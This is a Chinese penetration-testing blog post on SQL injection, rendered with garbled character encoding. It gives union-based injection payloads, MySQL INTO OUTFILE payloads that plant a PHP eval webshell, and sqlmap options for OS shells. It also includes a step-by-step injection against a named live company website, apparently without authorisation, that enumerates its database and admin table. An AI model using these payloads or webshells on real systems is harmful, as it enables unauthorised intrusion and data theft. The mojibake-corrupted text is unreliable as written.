<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>PenTest Vol.8 - Web | SQL [æŒç»­æ›´æ–°] - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">PenTest Vol.8 - Web | SQL [æŒç»­æ›´æ–°]</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>14 Minutes</li><li><i class="icon icon-calendar"></i>December 31, 2018</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="PenTest-Vol-8-Web-SQL-æŒç»­æ›´æ–°"><a href="#PenTest-Vol-8-Web-SQL-æŒç»­æ›´æ–°" class="headerlink" title="PenTest Vol.8 - Web | SQL [æŒç»­æ›´æ–°]"></a><center>PenTest Vol.8 - Web | SQL [æŒç»­æ›´æ–°]</center></h2><h3 id="ğŸ“-è¯­å¥åŸºç¡€"><a href="#ğŸ“-è¯­å¥åŸºç¡€" class="headerlink" title="ğŸ“ è¯­å¥åŸºç¡€"></a>ğŸ“ è¯­å¥åŸºç¡€</h3><h4 id="âš™ï¸-æ•°æ®åº“"><a href="#âš™ï¸-æ•°æ®åº“" class="headerlink" title="âš™ï¸ æ•°æ®åº“"></a>âš™ï¸ æ•°æ®åº“</h4><ul>
<li><p>æŸ¥æ‰€æœ‰æ•°æ®åº“</p>
<p>show databases;</p>
</li>
<li><p>åˆ›å»ºæ•°æ®åº“</p>
<p>create database new;</p>
</li>
<li><p>æŸ¥çœ‹æ•°æ®åº“</p>
<p>show create database new;</p>
</li>
<li><p>åˆ›å»ºæ•°æ®åº“åˆ¶å®šå­—ç¬¦é›†</p>
<p>create database new character set utf8/gbk;</p>
</li>
<li><p>åˆ é™¤æ•°æ®åº“</p>
<p>drop database new;</p>
</li>
<li><p>ä½¿ç”¨æ•°æ®åº“</p>
<p>use new;</p>
</li>
</ul>
<h4 id="âš™ï¸-è¡¨"><a href="#âš™ï¸-è¡¨" class="headerlink" title="âš™ï¸ è¡¨"></a>âš™ï¸ è¡¨</h4><ul>
<li><p>åˆ›å»ºè¡¨</p>
<p>create table new(</p>
<p>id int,</p>
<p>name carchar(10)</p>
<p>);</p>
</li>
<li><p>æŸ¥çœ‹æ‰€æœ‰è¡¨</p>
<p>show tables;</p>
</li>
<li><p>æŸ¥çœ‹å•ä¸ªè¡¨å±æ€§</p>
<p>show create table new;</p>
</li>
<li><p>æŸ¥çœ‹è¡¨å­—æ®µ</p>
<p>describe new;</p>
</li>
<li><p>åˆ›å»ºè¡¨åˆ¶å®šå¼•æ“å’Œå­—ç¬¦é›†</p>
<p>create table new(</p>
<p>id int,</p>
<p>name varchar(10)</p>
<p>)</p>
<p>engine = myisam/innodb charset = utf8/gbk;</p>
</li>
</ul>
<h4 id="âš™ï¸-ä¿®æ”¹è¡¨"><a href="#âš™ï¸-ä¿®æ”¹è¡¨" class="headerlink" title="âš™ï¸ ä¿®æ”¹è¡¨"></a>âš™ï¸ ä¿®æ”¹è¡¨</h4><ul>
<li><p>ä¿®æ”¹è¡¨å</p>
<p>rename table new to new1;</p>
</li>
<li><p>ä¿®æ”¹è¡¨å±æ€§</p>
<p>alter table new engine = myisam/innodb charset = utf8/bgk;</p>
</li>
<li><p>æ·»åŠ è¡¨å­—æ®µ</p>
<p>alter table new add age int first;</p>
<p>alter table new add age int after XXX;</p>
</li>
<li><p>åˆ é™¤è¡¨å­—æ®µ</p>
<p>alter table new drop age;</p>
</li>
<li><p>ä¿®æ”¹è¡¨å­—æ®µåå’Œç±»å‹</p>
<p>alter table new change age sex int;</p>
</li>
<li><p>ä¿®æ”¹è¡¨çš„ç±»å‹å’Œä½ç½®</p>
<p>alter table new modify age int;</p>
<p>alter table new modify age int first;</p>
<p>alter table new modify age int after XX;</p>
</li>
<li><p>åˆ é™¤è¡¨</p>
<p>drop table new;</p>
</li>
</ul>
<h4 id="âš™ï¸-æ•°æ®"><a href="#âš™ï¸-æ•°æ®" class="headerlink" title="âš™ï¸ æ•°æ®"></a>âš™ï¸ æ•°æ®</h4><ul>
<li><p>æ’å…¥æ•°æ®</p>
<ul>
<li><p>insert into new values(</p>
<p>5,â€™xiaomingâ€™,null</p>
<p>);</p>
</li>
<li><p>insert into new (id,name) values (2,â€™aaâ€™);</p>
</li>
<li><p>insert into new values (5,â€™xiaomingâ€™,null),(6,â€™xiaohongâ€™,null);</p>
</li>
<li><p>insert into new (id,name) values (2,â€™aaâ€™)(3,â€™bbâ€™)(4,â€™ccâ€™);</p>
</li>
</ul>
</li>
<li><p>æŸ¥è¯¢</p>
<ul>
<li>select * from new;</li>
<li>select name from new;</li>
<li>select * from new where id = 1;</li>
</ul>
</li>
<li><p>ä¿®æ”¹</p>
<p>update new set age = 100 where id = 10;</p>
</li>
<li><p>åˆ é™¤</p>
<p>delete from new where id = 10;</p>
</li>
</ul>
<h4 id="âš™ï¸-æ¸—é€"><a href="#âš™ï¸-æ¸—é€" class="headerlink" title="âš™ï¸ æ¸—é€"></a>âš™ï¸ æ¸—é€</h4><ul>
<li>åˆ¤æ–­æœ‰æ— æ³¨å…¥ç‚¹<ul>
<li>â€˜</li>
<li>1â€™ and â€˜1â€™=â€™1</li>
<li>1â€™ and â€˜1â€™=â€™2</li>
</ul>
</li>
<li>çŒœè§£å­—æ®µæ•°<ul>
<li>1â€™ order by 2#</li>
</ul>
</li>
<li>ç¡®å®šæ˜¾ç¤ºçš„ä½ç½®<ul>
<li>1â€™ union select 1,2#</li>
</ul>
</li>
<li>æŸ¥è¯¢å½“å‰æ•°æ®åº“åŠç‰ˆæœ¬<ul>
<li>1â€™ union select version(),database()#</li>
</ul>
</li>
<li>è·å–æ•°æ®åº“ä¸­çš„è¡¨<ul>
<li>1â€™ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</li>
</ul>
</li>
<li>è·å–è¡¨ä¸­çš„å­—æ®µå<ul>
<li>1â€™ union select 1,group_concat(column_name) from information_schema.columns where table_name=â€™usersâ€™#</li>
</ul>
</li>
<li>è·å¾—å­—æ®µä¸­çš„æ•°æ®<ul>
<li>1â€™ union select user,password from users#</li>
</ul>
</li>
</ul>
<h4 id="âš™ï¸-SQLæ³¨å…¥"><a href="#âš™ï¸-SQLæ³¨å…¥" class="headerlink" title="âš™ï¸ SQLæ³¨å…¥"></a>âš™ï¸ SQLæ³¨å…¥</h4><p>æ³¨å…¥åˆ†ä¸º int å‹å’Œå­—ç¬¦ä¸²å‹ã€‚</p>
<p>select * from admin where id = 1 and 1=1 â€“&gt; int å‹</p>
<p>select * from admin where id = 1 and â€˜1â€™=â€™1 â€“&gt; å­—ç¬¦ä¸²å‹</p>
<ol>
<li><p>å¸ƒå°”æ³¨å…¥        //è¿”å›çœŸæˆ–å‡</p>
</li>
<li><p>è”åˆæ³¨å…¥       //ä¸€èµ·æŸ¥è¯¢</p>
<p><strong>éœ€è¦è·å–å­—æ®µçš„æ€»æ•°</strong></p>
<p>group by</p>
<p>order by</p>
<p>è”åˆæŸ¥è¯¢ union select å­—æ®µï¼Œå­—æ®µï¼Œå­—æ®µ</p>
<p><strong>è·å–æ•°æ®åº“</strong></p>
<p>select database();</p>
<p><strong>è·å–æ•°æ®åº“é‡Œé¢çš„è¡¨</strong></p>
<ul>
<li><p>è·¨åº“</p>
<p>select * from new.student where number = 2;</p>
</li>
<li><p>æŸ¥çœ‹è¡¨</p>
<p>-1â€˜ union select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database();</p>
<p>å¦‚æœé™åˆ¶åªæ˜¾ç¤ºä¸€è¡Œï¼Œå°±ç”¨æ¡ä»¶ä½¿ç¬¬ä¸€è¡Œä¸æˆç«‹ï¼š</p>
</li>
</ul>
</li>
</ol>
<p><strong>è·å–è¡¨é‡Œçš„åˆ—</strong></p>
<p>-1â€™ union select 1,column_name from <strong>information_schema.columns</strong> where table_name=â€™usersâ€™ limit 1,1#</p>
<p><strong>è·å–è¡¨é‡Œé¢çš„å­—æ®µ</strong></p>
<p>-1â€˜ union select 1,</p>
<ol start="3">
<li>å»¶æ—¶æ³¨å…¥      //å®šæ—¶å™¨æŸ¥è¯¢</li>
<li>æŠ¥é”™æ³¨å…¥      //æŠ¥é”™ä½†æ˜¯ä¿¡æ¯æ˜¯æˆ‘ä»¬éœ€è¦çš„</li>
</ol>
<h4 id="âš™ï¸-limit-å’Œ-offset-çš„ç”¨æ³•ï¼š"><a href="#âš™ï¸-limit-å’Œ-offset-çš„ç”¨æ³•ï¼š" class="headerlink" title="âš™ï¸ limit å’Œ offset çš„ç”¨æ³•ï¼š"></a>âš™ï¸ limit å’Œ offset çš„ç”¨æ³•ï¼š</h4><ul>
<li><p>limit</p>
<ul>
<li><p>select * from users limit 0,1;</p>
<p>0 è¡¨ç¤ºåˆå§‹ä½ç½®ï¼Œ1è¡¨ç¤ºåç§»é‡</p>
</li>
<li><p>select * from users limit 10;</p>
<p>æ£€ç´¢å‰åè¡Œæ•°æ®</p>
</li>
</ul>
</li>
<li><p>offset</p>
<p>select * from users limit 1 offset 0;</p>
<p>ç”¨æ³•ä¸ limit ç›¸ä¼¼ï¼Œä½†æ˜¯ä½ç½®æ­£å¥½ç›¸åã€‚</p>
</li>
</ul>
<h4 id="âš™ï¸-mysql-å†™å…¥ä¸€å¥è¯æœ¨é©¬"><a href="#âš™ï¸-mysql-å†™å…¥ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="âš™ï¸ mysql å†™å…¥ä¸€å¥è¯æœ¨é©¬"></a>âš™ï¸ mysql å†™å…¥ä¸€å¥è¯æœ¨é©¬</h4><p>å‰ææ˜¯æœ‰ root æƒé™ï¼Œä¸”çŸ¥é“æœåŠ¡å™¨çš„ web ç»å¯¹è·¯å¾„ï¼ˆç›®å½•å…·æœ‰å†™æƒé™ï¼‰ï¼Œæ²¡æœ‰é…ç½® -secure-file-privã€‚</p>
<p>mysql æŸ¥è¯¢è¯­å¥æ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// æ­£å¸¸å†™æ³•</span><br><span class="line">select &quot;&lt;?php @eval($_POST[&apos;sb&apos;]);?&gt;&quot; into outfile &quot;/phpstudy/www/uploads/sb.php&quot;</span><br><span class="line"></span><br><span class="line">// æ³¨å…¥æ—¶å¯ union è”åˆæŸ¥è¯¢æ—¶</span><br><span class="line">?id=13 and 1=2 union select 1,2,3,4,5 &quot;&lt;?php @eval($_POST[&apos;sb&apos;]);?&gt;&quot; into outfile &quot;/phpstudy/www/uploads/sb.php&quot;</span><br><span class="line"></span><br><span class="line">// ä¸å¯ union è”åˆæŸ¥è¯¢æ—¶</span><br><span class="line">?id=13) into outfile &quot;/phpstudy/www/uploads/sb.php&quot; fields terminated by &quot;&lt;?php @eval(@_POST[SBSB]);?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼š</p>
<ol>
<li><p>ç»å¯¹è·¯å¾„çš„çŒœè§£ã€‚</p>
</li>
<li><p>into outfile åé¢çš„è·¯å¾„ï¼Œæ¯”å¦‚è¯´ â€œc:\wamp\uploads\muma.phpâ€ æœ‰æ—¶éœ€è¦å˜æˆ â€œc:\\wamp\\uploads\\muma.phpâ€ï¼ˆå¯¹åæ–œæ åšäº†ä¸€æ¬¡è½¬ä¹‰ï¼‰</p>
</li>
<li><p>è·¯å¾„å¯ä»¥ç¼–ç åå…­è¿›åˆ¶ã€‚</p>
</li>
<li><p>å®é™…åˆ©ç”¨æ—¶å€™çš„ payload æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select 1,2 &apos;&lt;?php @eval($_post[SB]);?&gt;&apos; into outfile &apos;/phpstudy/www/uploads/a.php&apos;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å†™å…¥çš„å†…å®¹åªæœ‰è”åˆæŸ¥è¯¢æŸ¥å‡ºçš„ 1ã€2ï¼Œä¸€å¥è¯æ²¡æœ‰å†™è¿›å»ï¼Œæ”¹ payload ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select 1,&apos;&lt;?php @eval($_post[SB]);?&gt;&apos; into outfile &apos;/phpstudy/www/uploads/a.php&apos;</span><br></pre></td></tr></table></figure>

<p>å†™å…¥æˆåŠŸï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹ã€‚</p>
</li>
</ol>
<h2 id="ğŸ“-ä¸€æ¬¡-mysql-æ³¨å…¥å®æˆ˜"><a href="#ğŸ“-ä¸€æ¬¡-mysql-æ³¨å…¥å®æˆ˜" class="headerlink" title="ğŸ“ ä¸€æ¬¡ mysql æ³¨å…¥å®æˆ˜"></a>ğŸ“ ä¸€æ¬¡ mysql æ³¨å…¥å®æˆ˜</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// Target</span><br><span class="line">http://www.ampak.com.tw</span><br><span class="line"></span><br><span class="line">// è¯¥ç½‘ç«™åˆ©ç”¨å·¥å…·æ³¨å…¥ä¼šé‡ç½®ï¼Œåˆæ­¥åˆ¤æ–­æœ‰ä¸€å®šé˜²æŠ¤ã€‚</span><br></pre></td></tr></table></figure>

<p>å¶ç„¶é—´æ‰¾åˆ°ä¸€ä¸ªå°æ¹¾ç«™ï¼Œç®€å•åˆ©ç”¨å•å¼•å·æ‰‹æµ‹äº†ä¸€ä¸‹å‘ç°ä¼šè¿”å› sql æŠ¥é”™ï¼Œåˆ¤æ–­ product.php?id= å‚æ•°å«æœ‰æ³¨å…¥ã€‚</p>
<p>æ¥ç€ç»§ç»­ and 1=1 / and 1=2 æµ‹è¯•è¿”å›è¿æ¥é‡ç½®ï¼Œåˆ¤æ–­å¯èƒ½æ˜¯å¯¹è¿™ä¸¤æ¡è¯­å¥åšäº†è¿‡æ»¤ï¼Œäºæ˜¯æ¢è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">product.php?id=13 and 12334=12334</span><br><span class="line">// è¿”å›æ­£å¸¸</span><br><span class="line"></span><br><span class="line">product.php?id=13 and 12334=12335</span><br><span class="line">// è¿”å›æŠ¥é”™</span><br></pre></td></tr></table></figure>

<p>è¯´æ˜é¡µé¢å­˜åœ¨æ³¨å…¥ã€‚</p>
<p>æ¥ç€ç»§ç»­ order by çŒœè§£å­—æ®µæ•°ï¼Œç»“æœæ˜¯ 8ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// order by æ˜¯æŒ‰è¡¨ä¸­æŸå­—æ®µæ’åˆ—è¡¨ä¸­çš„æ•°æ®</span><br><span class="line">// group by æ˜¯æŒ‰æŸäº›å­—æ®µåˆ†ç±»</span><br><span class="line"></span><br><span class="line">product.php?id=13 order by 8</span><br><span class="line">// è¿”å›æ­£å¸¸</span><br><span class="line"></span><br><span class="line">product.php?id=13 order by 9</span><br><span class="line">// è¿”å›æŠ¥é”™</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä¸Š union è”åˆæŸ¥è¯¢ï¼ŒæŸ¥è¯¢æ•°æ®åº“ï¼Œç‰ˆæœ¬ï¼Œç”¨æˆ·ç­‰ä¿¡æ¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=13&apos; union select 1,2,3,4,5,6,7,database()</span><br><span class="line">// è¿”å›ä¼šåœ¨å•å¼•å·å¤„æŠ¥é”™ï¼Œåé¢çš„è¯­å¥æ²¡æœ‰å¸¦å…¥æ‰§è¡Œï¼Œæƒ³äº†æƒ³æ¢æˆåˆ«çš„æŠ¥é”™æ–¹å¼</span><br><span class="line"></span><br><span class="line">?id=13 and 12334=12335 UNION SELECT 1,2,3,4,5,6,7,database()</span><br><span class="line">// è¿”å›æ•°æ®åº“ä¸º ampak_2016_kr</span><br><span class="line">// å…¶ä¸­ 3ï¼Œ4ï¼Œ7ï¼Œ8 æ˜¯å­—ç¬¦æ®µ</span><br><span class="line">// çŒœè§£å‡ºç‰ˆæœ¬ä¸º mysql 5.5.34</span><br><span class="line">// ç”¨æˆ· ampak_web@localhost</span><br><span class="line">// æ•°æ®åº“å®‰è£…è·¯å¾„ /var/lib/mysql/</span><br><span class="line">// mysql å®‰è£…è·¯å¾„ /usr</span><br><span class="line">// æ“ä½œç³»ç»Ÿ Linux</span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·ä¸æ˜¯ root æƒé™ï¼Œæœ‰ç‚¹é—æ†¾ï¼Œç›´æ¥çŒœè§£è¡¨ã€åˆ—ã€æ•°æ®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// æ•°æ®åº“æœ€å¥½åå…­è¿›åˆ¶ç¼–ç </span><br><span class="line">// åˆ©ç”¨ group_concat() æ³¨å…¥æ—¶ä¼šç›´æ¥é‡ç½®é¡µé¢ï¼Œæ€€ç–‘æ˜¯é˜²ç«å¢™åšäº†ç­–ç•¥ï¼Œåªå¥½é…åˆ limit ä¸€ä¸ªä¸€ä¸ªçŒœè§£ã€‚</span><br><span class="line">// çŒœè§£è¡¨</span><br><span class="line">?id=13 and 12345=54323 union select 1,2,3,4,5,6,table_name,8 from information_schema.tables where table_schema=ampak_2016_kr limit 0,1</span><br><span class="line"></span><br><span class="line">// çŒœè§£åˆ—</span><br><span class="line">?id=13 and 12345=54323 union select 1,2,3,4,5,6,column_name,8 from information_schema.columns where table_name=admin 0,1</span><br><span class="line"></span><br><span class="line">// çŒœè§£æ•°æ®</span><br><span class="line">?id=13 and 12345=54323 union select 1,2,3,4,5,6,account,8 from ampak_2016_kr.admin limit 0,1</span><br></pre></td></tr></table></figure>

<h4 id="ğŸ’¡-ç®€å•æ€»ç»“"><a href="#ğŸ’¡-ç®€å•æ€»ç»“" class="headerlink" title="ğŸ’¡ ç®€å•æ€»ç»“"></a>ğŸ’¡ ç®€å•æ€»ç»“</h4><ol>
<li>å¦‚æœå‚æ•°å¯èƒ½å­˜åœ¨æ³¨å…¥ï¼Œè®°å¾—è¦åˆ¤æ–­æ³¨å…¥ç±»å‹ï¼Œand 1=1 å’Œ and â€˜1â€™=â€™1â€™ éƒ½è¯•è¯•ã€‚</li>
<li>å› ä¸ºä»£ç ä¸åŒçš„ç¼˜æ•…ï¼Œæœ‰çš„æ³¨å…¥åœ¨ payload æœ€åéœ€è¦åŠ æ³¨é‡Šï¼Œæœ‰çš„ä¸éœ€è¦åŠ ã€‚</li>
<li>æœ‰çš„æ³¨å…¥å¯èƒ½è¿‡æ»¤äº† and 1=1ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥æ¢å…¶ä»–çš„æ•°å€¼æ¥æµ‹è¯•ä¸€ä¸‹ã€‚</li>
<li>å½“ä¸èƒ½ group_concat() å…¨éƒ¨çŒœè§£è¡¨æˆ–åˆ—æ—¶ï¼Œå¯ä»¥å°è¯•å•ä¸ªè¡¨ã€åˆ—æ¥çŒœè§£ã€‚</li>
</ol>
<h2 id="ğŸŒ-sqlmap"><a href="#ğŸŒ-sqlmap" class="headerlink" title="ğŸŒ sqlmap"></a>ğŸŒ sqlmap</h2><h3 id="ğŸ“-sqlmap-General"><a href="#ğŸ“-sqlmap-General" class="headerlink" title="ğŸ“ sqlmap General"></a>ğŸ“ sqlmap General</h3><ul>
<li>-u æŒ‡å®š url</li>
<li>-b è·å– dbms banner</li>
<li>-m ä»æ–‡æœ¬ä¸­åŠ è½½ç›®æ ‡è¯·æ±‚</li>
<li>-g ä» google çš„æœç´¢ç»“æœä¸­æµ‹è¯•</li>
<li>â€“data ä»¥ post æ–¹å¼æäº¤æ•°æ®</li>
<li>â€“cookie è®¾ç½® cookie çš„å€¼</li>
<li>â€“current-db è·å–å½“å‰æ•°æ®åº“</li>
<li>â€“current-user è·å–å½“å‰ç”¨æˆ·</li>
<li>â€“string åŒ¹é…é¡µé¢ä¸­çš„å­—ç¬¦ä¸²</li>
<li>â€“users æšä¸¾ dbms ç”¨æˆ·</li>
<li>â€“password ç¾å‰§ dbms ç”¨æˆ·å¯†ç  Hash</li>
<li>â€“dbs æšä¸¾ dbms ä¸­çš„æ•°æ®åº“</li>
<li>-D æšä¸¾æ•°æ®åº“</li>
<li>â€“tables å’Œ -D é…åˆä½¿ç”¨ï¼Œæšä¸¾è¡¨å</li>
<li>-T æšä¸¾å…·ä½“è¡¨å</li>
<li>â€“columns å’Œ -D -T é…åˆä½¿ç”¨ï¼Œæšä¸¾åˆ—å</li>
<li>-C æšä¸¾å…·ä½“åˆ—å</li>
<li>â€“dump è·å–æ•°æ®</li>
<li>â€“privileges æŸ¥çœ‹æƒé™</li>
<li>â€“privileges-Uroot æŸ¥çœ‹æŒ‡å®šç”¨æˆ·æƒé™</li>
<li>â€“os-cmd=whoami æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li>
<li>â€“os-shell ç³»ç»Ÿäº¤äº’å¼ shell</li>
<li>â€“os-pwn åå¼¹ shell</li>
<li>â€“reg-read è¯»å– Windows ç³»ç»Ÿæ³¨å†Œè¡¨</li>
<li>â€“dbs-o â€œsqlmap.logâ€ ä¿å­˜è¿›åº¦</li>
</ul>
<h3 id="ğŸ“-sqlmap-POST-å‹æ³¨å…¥ç”¨æ³•"><a href="#ğŸ“-sqlmap-POST-å‹æ³¨å…¥ç”¨æ³•" class="headerlink" title="ğŸ“ sqlmap POST å‹æ³¨å…¥ç”¨æ³•"></a>ğŸ“ sqlmap POST å‹æ³¨å…¥ç”¨æ³•</h3><ol>
<li><p>burp æˆªæ–­æ•°æ®åŒ…</p>
</li>
<li><p>å³é”® copy to file ä¿å­˜ä¸ºæ–‡ä»¶</p>
</li>
<li><p>æ‰§è¡Œ sqlmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./sqlmap.py -r ~/a.txt</span><br></pre></td></tr></table></figure>

</li>
</ol>
</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck67g9f7f000i3lozi1dtvcet" data-title="PenTest Vol.8 - Web | SQL [æŒç»­æ›´æ–°]" data-url="http://yoursite.com/2018/12/31/SQL/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
var duoshuoQuery = {short_name: siteName};
(function() {
  var ds = document.createElement('script');
  ds.type = 'text/javascript';ds.async = true;
  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
  ds.charset = 'UTF-8';
  (document.getElementsByTagName('head')[0] 
  || document.getElementsByTagName('body')[0]).appendChild(ds);
})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2019/01/02/use-hexo/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2018/04/05/study/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="http://47.95.140.43/tu/721580653348_.pic.jpg" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">Â© 2020 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
window.onload = function () {
  wrap.className += ' done';
}</script></body></html>